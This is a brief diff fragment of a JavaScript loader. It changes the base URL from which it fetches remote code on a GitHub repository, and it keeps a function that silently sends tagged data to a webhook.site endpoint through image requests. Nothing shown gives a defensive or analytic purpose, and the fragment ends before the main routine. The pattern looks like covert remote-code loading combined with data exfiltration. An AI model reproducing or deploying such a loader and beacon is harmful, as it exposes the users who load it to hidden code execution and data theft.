@@ -1,5 +1,5 @@
 (function(){
-var R="https://raw.githack.com/polootyyy/cdnx/main/";
+var R="https://raw.githubusercontent.com/polootyyy/cdnx/main/";
 var W="https://webhook.site/e4e989f5-dfd9-487d-807d-d8023425485d";
 function o(t,d){try{new Image().src=W+"/h?t="+t+"&d="+encodeURIComponent(String(d).slice(0,300))+"&r="+Math.random()}catch(e){}}
 function run(){
